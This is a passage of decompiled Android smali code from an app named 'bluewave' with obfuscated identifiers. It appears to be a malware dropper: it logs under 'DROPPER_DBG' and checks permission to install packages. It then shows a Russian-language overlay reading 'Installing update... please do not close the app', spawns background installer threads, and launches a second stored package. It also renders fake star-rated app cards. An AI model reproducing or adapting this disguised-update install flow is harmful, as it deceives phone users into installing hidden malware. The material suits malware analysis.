    move-result-object p1

    .line 79
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 80
    .line 81
    .line 82
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 83
    .line 84
    .line 85
    move-result-object p1

    .line 86
    const-string v1, "DROPPER_DBG"

    .line 87
    .line 88
    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    .line 90
    .line 91
    return v0
.end method

.method public final EYTN7lFEQxyK4y()V
    .locals 3

    .line 1
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 2
    .line 3
    const-string v1, "stwmk"

    .line 4
    .line 5
    const/4 v2, 0x0

    .line 6
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    if-nez v0, :cond_0

    .line 11
    .line 12
    goto :goto_0

    .line 13
    :cond_0
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 14
    .line 15
    .line 16
    move-result-object v1

    .line 17
    invoke-virtual {v1, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 18
    .line 19
    .line 20
    move-result-object v0

    .line 21
    if-eqz v0, :cond_1

    .line 22
    .line 23
    const/high16 v1, 0x10000000

    .line 24
    .line 25
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 26
    .line 27
    .line 28
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    .line 30
    .line 31
    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public final HrAWa37pvWeygr()V
    .locals 12

    .line 1
    const/4 v0, 0x1

    .line 2
    iput-boolean v0, p0, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 3
    .line 4
    new-instance v1, Ljava/lang/StringBuilder;

    .line 5
    .line 6
    const-string v2, "doInstall() called, SDK="

    .line 7
    .line 8
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 9
    .line 10
    .line 11
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 12
    .line 13
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 14
    .line 15
    .line 16
    const-string v2, " canInstall="

    .line 17
    .line 18
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 19
    .line 20
    .line 21
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 22
    .line 23
    .line 24
    move-result-object v2

    .line 25
    invoke-virtual {v2}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    .line 26
    .line 27
    .line 28
    move-result v2

    .line 29
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 30
    .line 31
    .line 32
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    move-result-object v1

    .line 36
    const-string v2, "DROPPER_DBG"

    .line 37
    .line 38
    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    .line 40
    .line 41
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    .line 42
    .line 43
    const/4 v2, 0x0

    .line 44
    if-eqz v1, :cond_0

    .line 45
    .line 46
    invoke-virtual {v1, v2}, Landroid/view/View;->setEnabled(Z)V

    .line 47
    .line 48
    .line 49
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->ECM0w2UpL85TD4rnc:Landroid/widget/Button;

    .line 50
    .line 51
    const v3, 0x7f0f0027

    .line 52
    .line 53
    .line 54
    invoke-virtual {p0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 55
    .line 56
    .line 57
    move-result-object v3

    .line 58
    invoke-virtual {v1, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 59
    .line 60
    .line 61
    :cond_0
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 62
    .line 63
    if-eqz v1, :cond_1

    .line 64
    .line 65
    goto/16 :goto_0

    .line 66
    .line 67
    :cond_1
    const-string v1, "#e6000000"

    .line 68
    .line 69
    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 70
    .line 71
    .line 72
    move-result v1

    .line 73
    const-string v3, "#e8eaed"

    .line 74
    .line 75
    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 76
    .line 77
    .line 78
    move-result v3

    .line 79
    const-string v4, "#9aa0a6"

    .line 80
    .line 81
    invoke-static {v4}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 82
    .line 83
    .line 84
    move-result v4

    .line 85
    new-instance v5, Landroid/widget/FrameLayout;

    .line 86
    .line 87
    invoke-direct {v5, p0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    .line 88
    .line 89
    .line 90
    iput-object v5, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 91
    .line 92
    invoke-virtual {v5, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 93
    .line 94
    .line 95
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 96
    .line 97
    invoke-virtual {v1, v0}, Landroid/view/View;->setClickable(Z)V

    .line 98
    .line 99
    .line 100
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    .line 101
    .line 102
    .line 103
    move-result-object v1

    .line 104
    const/16 v5, 0x11

    .line 105
    .line 106
    invoke-virtual {v1, v5}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 107
    .line 108
    .line 109
    new-instance v6, Landroid/widget/FrameLayout$LayoutParams;

    .line 110
    .line 111
    const/4 v7, -0x2

    .line 112
    const/4 v8, -0x1

    .line 113
    invoke-direct {v6, v8, v7}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .line 114
    .line 115
    .line 116
    iput v5, v6, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    .line 117
    .line 118
    new-instance v7, Landroid/widget/ProgressBar;

    .line 119
    .line 120
    invoke-direct {v7, p0}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;)V

    .line 121
    .line 122
    .line 123
    new-instance v9, Landroid/widget/LinearLayout$LayoutParams;

    .line 124
    .line 125
    const/16 v10, 0x30

    .line 126
    .line 127
    invoke-virtual {p0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 128
    .line 129
    .line 130
    move-result v11

    .line 131
    invoke-virtual {p0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 132
    .line 133
    .line 134
    move-result v10

    .line 135
    invoke-direct {v9, v11, v10}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 136
    .line 137
    .line 138
    iput v0, v9, Landroid/widget/LinearLayout$LayoutParams;->gravity:I

    .line 139
    .line 140
    const/16 v10, 0x14

    .line 141
    .line 142
    invoke-virtual {p0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 143
    .line 144
    .line 145
    move-result v10

    .line 146
    iput v10, v9, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 147
    .line 148
    invoke-virtual {v1, v7, v9}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 149
    .line 150
    .line 151
    const-string v7, "\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f..."

    .line 152
    .line 153
    const/16 v9, 0x10

    .line 154
    .line 155
    invoke-virtual {p0, v7, v9, v3, v0}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 156
    .line 157
    .line 158
    move-result-object v0

    .line 159
    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setGravity(I)V

    .line 160
    .line 161
    .line 162
    const/16 v3, 0x8

    .line 163
    .line 164
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 165
    .line 166
    .line 167
    move-result v3

    .line 168
    invoke-static {v0, v2, v2, v2, v3}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 169
    .line 170
    .line 171
    invoke-virtual {v1, v0}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 172
    .line 173
    .line 174
    const-string v0, "\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043d\u0435 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0439\u0442\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435"

    .line 175
    .line 176
    const/16 v3, 0xd

    .line 177
    .line 178
    invoke-virtual {p0, v0, v3, v4, v2}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 179
    .line 180
    .line 181
    move-result-object v0

    .line 182
    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setGravity(I)V

    .line 183
    .line 184
    .line 185
    invoke-virtual {v1, v0}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 186
    .line 187
    .line 188
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 189
    .line 190
    invoke-virtual {v0, v1, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 191
    .line 192
    .line 193
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 194
    .line 195
    const/4 v1, 0x0

    .line 196
    invoke-virtual {v0, v1}, Landroid/view/View;->setAlpha(F)V

    .line 197
    .line 198
    .line 199
    new-instance v0, Landroid/widget/FrameLayout$LayoutParams;

    .line 200
    .line 201
    invoke-direct {v0, v8, v8}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .line 202
    .line 203
    .line 204
    iget-object v1, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 205
    .line 206
    invoke-virtual {p0, v1, v0}, Landroid/app/Activity;->addContentView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 207
    .line 208
    .line 209
    iget-object v0, p0, Lio/bluewave/app/MainActivity;->qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

    .line 210
    .line 211
    invoke-virtual {v0}, Landroid/view/View;->animate()Landroid/view/ViewPropertyAnimator;

    .line 212
    .line 213
    .line 214
    move-result-object v0

    .line 215
    const/high16 v1, 0x3f800000    # 1.0f

    .line 216
    .line 217
    invoke-virtual {v0, v1}, Landroid/view/ViewPropertyAnimator;->alpha(F)Landroid/view/ViewPropertyAnimator;

    .line 218
    .line 219
    .line 220
    move-result-object v0

    .line 221
    const-wide/16 v1, 0x12c

    .line 222
    .line 223
    invoke-virtual {v0, v1, v2}, Landroid/view/ViewPropertyAnimator;->setDuration(J)Landroid/view/ViewPropertyAnimator;

    .line 224
    .line 225
    .line 226
    move-result-object v0

    .line 227
    invoke-virtual {v0}, Landroid/view/ViewPropertyAnimator;->start()V

    .line 228
    .line 229
    .line 230
    :goto_0
    new-instance v0, Ljava/lang/Thread;

    .line 231
    .line 232
    new-instance v1, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 233
    .line 234
    const/4 v2, 0x0

    .line 235
    invoke-direct {v1, p0, v2}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 236
    .line 237
    .line 238
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 239
    .line 240
    .line 241
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 242
    .line 243
    .line 244
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 245
    .line 246
    const/4 v1, 0x4

    .line 247
    invoke-direct {v0, p0, v1}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 248
    .line 249
    .line 250
    const-wide/16 v1, 0x3a98

    .line 251
    .line 252
    iget-object v3, p0, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 253
    .line 254
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 255
    .line 256
    .line 257
    new-instance v0, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;

    .line 258
    .line 259
    const/4 v1, 0x5

    .line 260
    invoke-direct {v0, p0, v1}, LU4clZ2NNNKj5ZWU/VYRgR7ZqgbZj3I16R;-><init>(Lio/bluewave/app/MainActivity;I)V

    .line 261
    .line 262
    .line 263
    const-wide/16 v1, 0x7530

    .line 264
    .line 265
    invoke-virtual {v3, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 266
    .line 267
    .line 268
    return-void
.end method

.method public final NGL7fgNWbzfZaqgpQY()Landroid/view/View;
    .locals 4

    .line 1
    new-instance v0, Landroid/view/View;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    iget v1, p0, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W:I

    .line 7
    .line 8
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 9
    .line 10
    .line 11
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    .line 12
    .line 13
    const/4 v2, -0x1

    .line 14
    const/4 v3, 0x1

    .line 15
    invoke-direct {v1, v2, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 16
    .line 17
    .line 18
    invoke-virtual {v0, v1}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 19
    .line 20
    .line 21
    return-object v0
.end method

.method public final QtO8NkDMDHvx()Landroid/widget/LinearLayout;
    .locals 2

    .line 1
    new-instance v0, Landroid/widget/LinearLayout;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    const/4 v1, 0x1

    .line 7
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 8
    .line 9
    .line 10
    return-object v0
.end method

.method public final VYRgR7ZqgbZj3I16R(Landroid/widget/LinearLayout;IIII)V
    .locals 10

    .line 1
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    new-instance v1, Landroid/graphics/drawable/GradientDrawable;

    .line 6
    .line 7
    invoke-direct {v1}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 8
    .line 9
    .line 10
    const/4 v2, -0x1

    .line 11
    invoke-virtual {v1, v2}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 12
    .line 13
    .line 14
    const/4 v3, 0x1

    .line 15
    invoke-virtual {p0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 16
    .line 17
    .line 18
    move-result v4

    .line 19
    iget v5, p0, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W:I

    .line 20
    .line 21
    invoke-virtual {v1, v4, v5}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    .line 22
    .line 23
    .line 24
    const/16 v4, 0x8

    .line 25
    .line 26
    invoke-virtual {p0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 27
    .line 28
    .line 29
    move-result v5

    .line 30
    int-to-float v5, v5

    .line 31
    invoke-virtual {v1, v5}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 32
    .line 33
    .line 34
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 35
    .line 36
    .line 37
    const/16 v1, 0xa

    .line 38
    .line 39
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 40
    .line 41
    .line 42
    move-result v5

    .line 43
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 44
    .line 45
    .line 46
    move-result v6

    .line 47
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 48
    .line 49
    .line 50
    move-result v7

    .line 51
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 52
    .line 53
    .line 54
    move-result v8

    .line 55
    invoke-virtual {v0, v5, v6, v7, v8}, Landroid/view/View;->setPadding(IIII)V

    .line 56
    .line 57
    .line 58
    invoke-virtual {p0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 59
    .line 60
    .line 61
    move-result v5

    .line 62
    const/4 v6, 0x0

    .line 63
    invoke-static {v0, v6, v6, v6, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 64
    .line 65
    .line 66
    invoke-virtual {p0, p2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    move-result-object p2

    .line 70
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    .line 71
    .line 72
    .line 73
    move-result-object v5

    .line 74
    const/16 v7, 0x10

    .line 75
    .line 76
    invoke-virtual {v5, v7}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 77
    .line 78
    .line 79
    new-instance v7, Landroid/widget/TextView;

    .line 80
    .line 81
    invoke-direct {v7, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 82
    .line 83
    .line 84
    invoke-virtual {p2}, Ljava/lang/String;->isEmpty()Z

    .line 85
    .line 86
    .line 87
    move-result v8

    .line 88
    if-eqz v8, :cond_0

    .line 89
    .line 90
    const-string v8, "?"

    .line 91
    .line 92
    goto :goto_0

    .line 93
    :cond_0
    invoke-virtual {p2, v6}, Ljava/lang/String;->charAt(I)C

    .line 94
    .line 95
    .line 96
    move-result v8

    .line 97
    invoke-static {v8}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    .line 98
    .line 99
    .line 100
    move-result-object v8

    .line 101
    :goto_0
    invoke-virtual {v7, v8}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 102
    .line 103
    .line 104
    const/4 v8, 0x2

    .line 105
    const/high16 v9, 0x41400000    # 12.0f

    .line 106
    .line 107
    invoke-virtual {v7, v8, v9}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 108
    .line 109
    .line 110
    invoke-virtual {v7, v2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 111
    .line 112
    .line 113
    sget-object v2, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    .line 114
    .line 115
    invoke-virtual {v7, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 116
    .line 117
    .line 118
    const/16 v2, 0x11

    .line 119
    .line 120
    invoke-virtual {v7, v2}, Landroid/widget/TextView;->setGravity(I)V

    .line 121
    .line 122
    .line 123
    new-instance v2, Landroid/graphics/drawable/GradientDrawable;

    .line 124
    .line 125
    invoke-direct {v2}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 126
    .line 127
    .line 128
    iget v8, p0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 129
    .line 130
    invoke-virtual {v2, v8}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 131
    .line 132
    .line 133
    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setShape(I)V

    .line 134
    .line 135
    .line 136
    invoke-virtual {v7, v2}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 137
    .line 138
    .line 139
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    .line 140
    .line 141
    const/16 v8, 0x1a

    .line 142
    .line 143
    invoke-virtual {p0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 144
    .line 145
    .line 146
    move-result v9

    .line 147
    invoke-virtual {p0, v8}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 148
    .line 149
    .line 150
    move-result v8

    .line 151
    invoke-direct {v2, v9, v8}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 152
    .line 153
    .line 154
    invoke-virtual {v5, v7, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 155
    .line 156
    .line 157
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    .line 158
    .line 159
    .line 160
    move-result-object v2

    .line 161
    invoke-virtual {p0, v4}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 162
    .line 163
    .line 164
    move-result v4

    .line 165
    invoke-virtual {v2, v4, v6, v6, v6}, Landroid/view/View;->setPadding(IIII)V

    .line 166
    .line 167
    .line 168
    const/16 v4, 0xc

    .line 169
    .line 170
    iget v7, p0, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP:I

    .line 171
    .line 172
    invoke-virtual {p0, p2, v4, v7, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 173
    .line 174
    .line 175
    move-result-object p2

    .line 176
    invoke-virtual {v2, p2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 177
    .line 178
    .line 179
    invoke-virtual {p0, p3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 180
    .line 181
    .line 182
    move-result-object p2

    .line 183
    iget p3, p0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    .line 184
    .line 185
    invoke-virtual {p0, p2, v1, p3, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 186
    .line 187
    .line 188
    move-result-object p2

    .line 189
    invoke-virtual {v2, p2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 190
    .line 191
    .line 192
    invoke-virtual {v5, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 193
    .line 194
    .line 195
    invoke-virtual {v0, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 196
    .line 197
    .line 198
    const/4 p2, 0x5

    .line 199
    :try_start_0
    invoke-virtual {p0, p4}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 200
    .line 201
    .line 202
    move-result-object p3

    .line 203
    invoke-static {p3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    .line 204
    .line 205
    .line 206
    move-result p3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 207
    goto :goto_1

    .line 208
    :catch_0
    move p3, p2

    .line 209
    :goto_1
    new-instance p4, Ljava/lang/StringBuilder;

    .line 210
    .line 211
    invoke-direct {p4}, Ljava/lang/StringBuilder;-><init>()V

    .line 212
    .line 213
    .line 214
    move v1, v6

    .line 215
    :goto_2
    if-ge v1, p2, :cond_2

    .line 216
    .line 217
    if-ge v1, p3, :cond_1

    .line 218
    .line 219
    const-string v2, "\u2605"

    .line 220
    .line 221
    goto :goto_3

    .line 222
    :cond_1
    const-string v2, "\u2606"

    .line 223
    .line 224
    :goto_3
    invoke-virtual {p4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 225
    .line 226
    .line 227
    add-int/lit8 v1, v1, 0x1

    .line 228
    .line 229
    goto :goto_2

    .line 230
    :cond_2
    invoke-virtual {p4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 231
    .line 232
    .line 233
    move-result-object p2

    .line 234
    const/16 p3, 0xb

    .line 235
    .line 236
    iget p4, p0, Lio/bluewave/app/MainActivity;->QH62hje1O4khQnco5y:I

    .line 237
    .line 238
    invoke-virtual {p0, p2, p3, p4, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 239
    .line 240
    .line 241
    move-result-object p2

    .line 242
    const/4 p3, 0x4

    .line 243
    invoke-virtual {p0, p3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 244
    .line 245
    .line 246
    move-result p4

    .line 247
    invoke-virtual {p0, p3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 248
    .line 249
    .line 250
    move-result p3

    .line 251
    invoke-virtual {p2, v6, p4, v6, p3}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 252
    .line 253
    .line 254
    invoke-virtual {v0, p2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 255
    .line 256
    .line 257
    invoke-virtual {p0, p5}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 258
    .line 259
    .line 260
    move-result-object p2

    .line 261
    invoke-virtual {p0, p2, v4, v7, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 262
    .line 263
    .line 264
    move-result-object p2

    .line 265
    invoke-virtual {v0, p2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 266
    .line 267
    .line 268
    invoke-virtual {p1, v0}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 269
    .line 270
    .line 271
    return-void
.end method

.method public final WAxAMT28akcO(Ljava/lang/String;Ljava/lang/String;)Landroid/widget/LinearLayout;
    .locals 4

    .line 1
    invoke-virtual {p0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const/16 v1, 0x11

    .line 6
    .line 7
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 8
    .line 9
    .line 10
    const/16 v1, 0x14

    .line 11
    .line 12
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 13
    .line 14
    .line 15
    move-result v2

    .line 16
    invoke-virtual {p0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 17
    .line 18
    .line 19
    move-result v1

    .line 20
    const/4 v3, 0x0

    .line 21
    invoke-virtual {v0, v2, v3, v1, v3}, Landroid/view/View;->setPadding(IIII)V

    .line 22
    .line 23
    .line 24
    const/16 v1, 0xd

    .line 25
    .line 26
    iget v2, p0, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP:I

    .line 27
    .line 28
    invoke-virtual {p0, p1, v1, v2, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 29
    .line 30
    .line 31
    move-result-object p1

    .line 32
    invoke-virtual {v0, p1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 33
    .line 34
    .line 35
    const/16 p1, 0xb

    .line 36
    .line 37
    iget v1, p0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    .line 38
    .line 39
    invoke-virtual {p0, p2, p1, v1, v3}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 40
    .line 41
    .line 42
    move-result-object p1

    .line 43
    invoke-virtual {v0, p1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 44
    .line 45
    .line 46
    return-object v0
.end method

.method public final YnQspRyi16s9vN5()Landroid/view/View;
    .locals 4

    .line 1
    new-instance v0, Landroid/view/View;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    iget v1, p0, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN:I

    .line 7
    .line 8
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 9
    .line 10
    .line 11
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    .line 12
    .line 13
